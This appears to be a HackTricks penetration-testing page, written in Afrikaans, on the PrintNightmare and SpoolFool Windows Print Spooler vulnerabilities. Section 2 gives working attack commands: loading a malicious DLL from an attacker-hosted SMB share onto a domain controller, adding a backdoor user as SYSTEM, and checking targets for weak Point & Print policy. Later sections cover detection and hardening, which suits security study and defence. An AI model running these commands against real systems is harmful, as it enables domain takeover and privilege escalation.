# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is die versamelnaam vir 'n familie kwesbaarhede in die Windows **Print Spooler**-diens wat **arbitrêre kode-uitvoering as SYSTEM** moontlik maak en, wanneer die spooler oor RPC bereikbaar is, **remote code execution (RCE) op domeinbeheerders en lêerbedieners** moontlik maak. Die CVE's wat die meeste uitgebuit is, is **CVE-2021-1675** (aanvanklik as LPE geklassifiseer) en **CVE-2021-34527** (volledige RCE). Daaropvolgende probleme soos **CVE-2021-34481 (“Point & Print”)** en **CVE-2022-21999 (“SpoolFool”)** bewys dat die attack surface steeds ver van gesluit is.

As jy op soek is na **authentication coercion / relay** via die spooler eerder as **driver-based RCE/LPE**, kyk na [hierdie ander bladsy oor printer coercion abuse](printers-spooler-service-abuse.md). Hierdie bladsy fokus op die **laai van drivers / DLL's as SYSTEM**.

---

## 1. Kwesbare komponente & CVE's

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Geplak in die Junie 2021 CU, maar omseil deur CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` laat geauthentiseerde gebruikers toe om 'n driver DLL vanaf 'n remote share te laai; ná Augustus 2021 vereis dit gewoonlik verswakte Point & Print-beleide|
|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver-installasie deur nie-admin-gebruikers|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrêre gidskepping → DLL planting – werk ná die 2021-pleisters|

Almal buit een van die **MS-RPRN / MS-PAR RPC-metodes** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) of vertrouensverhoudings binne **Point & Print** uit.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

'n Geauthentiseerde maar **nie-bevoorregte** domeingebruiker kan arbitrêre DLL's as **NT AUTHORITY\SYSTEM** op 'n remote spooler (dikwels die DC) uitvoer deur:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Gewilde PoCs sluit **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) en Benjamin Delpy se `misc::printnightmare / lsa::addsid`-modules in **mimikatz** in.

### 2.2 Plaaslike privilege escalation (enige ondersteunde Windows, 2021-2024)

Dieselfde API kan **plaaslik** geroep word om ’n driver vanaf `C:\Windows\System32\spool\drivers\x64\3\` te laai en SYSTEM-privileges te verkry:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Moderne triage op gelapte hosts

Op ’n volledig opgedateerde host misluk publieke PrintNightmare PoCs dikwels omdat Windows nou standaard **slegs-administrateur**-installasie van printerdrywers gebruik (`RestrictDriverInstallationToAdministrators=1` sedert 10 Augustus 2021). Voordat jy ’n exploit teen ’n teiken gebruik, kyk eers of die omgewing daardie veiligheidsverandering vir legacy-printerontplooiings teruggerol het:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Die twee interessantste swak waardes is gewoonlik:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bevestig vanaf Linux vinnig dat die teiken die relevante print RPC interfaces blootstel voordat jy ’n PoC uitvoer:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Sommige nuwer publieke tools bied ook ’n veiliger **check/list**-werkvloei voordat ’n DLL gestuur word:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Indien jy `RPC_E_ACCESS_DENIED` (`0x8001011b`) as ’n gebruiker met lae privilegies kry, sien jy gewoonlik die verstekgedrag ná 2021 eerder as ’n transport failure.

> Op Windows 11 22H2+ en nuwer client builds gebruik remote printing by verstek **RPC over TCP**, en **RPC over named pipes** (`\PIPE\spoolss`) is gedeaktiveer tensy dit uitdruklik heraktiveer word. Sommige ouer PoCs en labnotas neem steeds aan dat die named pipe bereikbaar is.<sup>[[4]](#references)</sup>

### 2.4 Package Point & Print abuse on “patched” networks

Baie enterprise-omgewings het ná die oorspronklike 2021-patches **kwesbaar gebly weens beleid**, omdat helpdesk- of print-server-werksvloeie steeds vereis het dat nie-admingebruikers drivers installeer of bywerk. In die praktyk word die offensive playbook:

- Indien security prompts volledig gedeaktiveer is, is **classic arbitrary-DLL PrintNightmare** steeds die kortste pad.
- Indien `Only use Package Point and Print` geaktiveer is, moet jy gewoonlik na ’n **signed package-aware driver**-pad pivot eerder as om ’n raw DLL drop te doen.<sup>[[3]](#references)</sup>
- Navorsing in 2024 het gewys dat **`Package Point and Print - Approved servers` nie op sigself ’n harde trust boundary is nie**: indien ’n attacker name resolution vir een goedgekeurde print server kan spoof of hijack, kan victims steeds herlei word na ’n malicious server wat aan die policy checks voldoen.<sup>[[4]](#references)</sup>
- Selfs die kombinasie van UNC hardening met geforseerde RPC-over-SMB kan onbetroubaar wees, omdat moderne clients moontlik **terugval na RPC over TCP**.<sup>[[4]](#references)</sup>

Dit is waarom moderne PrintNightmare-style exploitation dikwels meer gaan oor **die misbruik van enterprise-printer deployment policy** as om die oorspronklike 2021-PoC onveranderd te replay.

### 2.5 SpoolFool (CVE-2022-21999) – om 2021-fixes te omseil

Microsoft se 2021-patches het remote driver loading geblokkeer, maar **het nie directory permissions gehard nie**. SpoolFool misbruik die `SpoolDirectory`-parameter om ’n arbitrêre directory onder `C:\Windows\System32\spool\drivers\` te skep, laat ’n payload DLL daar, en dwing die spooler om dit te laai:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Die exploit werk op volledig gepatchte Windows 7 → Windows 11 en Server 2012R2 → 2022 voor Februarie 2022-opdaterings<sup>[[2]](#references)</sup>

---

## 3. Opsporing & hunting

* **PrintService logs** – aktiveer die *Microsoft-Windows-PrintService/Operational*-kanaal en monitor **Event ID 316** (driver added/updated, sluit gewoonlik die DLL-name in) tydens beide suksesvolle en mislukte pogings. Kombineer dit met **Event ID 808/811** vir verdagte spooler-module/driver-load failures.
* **Sysmon** – `Event ID 7` (Image loaded) of `11/23` (File write/delete) binne `C:\Windows\System32\spool\drivers\*` wanneer die parent process **spoolsv.exe** is.
* **Process lineage** – genereer ’n alert wanneer **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell of enige onverwagte unsigned child process spawn.
* **Network telemetry** – onverwagte SMB-fetches vanaf `spoolsv.exe` na attacker-controlled shares, of ongewone printer RPC-verkeer vanaf servers wat nie as print servers behoort op te tree nie, is albei high-signal leads.

## 4. Mitigation & hardening

1. **Patch!** – Pas die jongste cumulative update toe op elke Windows-host waarop die Print Spooler-service geïnstalleer is.
2. **Disable die spooler waar dit nie benodig word nie**, veral op Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Block remote connections** terwyl local printing steeds toegelaat word – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Hou Point & Print admin-only** deur die volgende te stel:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Gedetailleerde guidance in Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Indien besigheidsvereistes `RestrictDriverInstallationToAdministrators=0` afdwing, behandel elke ander printer policy as slegs ’n **partial mitigation**. Verkies ten minste **package-aware drivers**, aktiveer **Only use Package Point and Print**, en beperk **Package Point and Print - Approved servers** tot eksplisiete print servers binne die forest.<sup>[[3]](#references)</sup>
6. **Moenie printer RPC privacy terugrol** net om gebroke printer mappings reg te stel nie. Environments wat `RpcAuthnLevelPrivacyEnabled=0` stel, maak hardening wat vir **CVE-2021-1678** bygevoeg is, ongedaan en verdien gewoonlik ekstra scrutiny tydens ’n engagement.<sup>[[4]](#references)</sup>

---

## 5. Verwante research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standaard Impacket-implementering met `-check`, `-list` en `-delete` modes
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper met ingeboude SMB delivery, multi-target support en beide `MS-RPRN` / `MS-PAR` modes
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – bring-your-own-vulnerable-printer-driver abuse deur package Point & Print
* SpoolFool exploit & write-up
* 0patch micropatches vir SpoolFool en ander spooler bugs

As jy **authentication wil coerce** via die spooler in plaas daarvan om ’n driver te laai, gaan na [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Verwysings

- [1] [Microsoft – KB5005652: Bestuur nuwe Point & Print verstek-driver-installasiegedrag](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – ’n Praktiese gids tot PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – Die PrintNightmare is nog nie verby nie](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
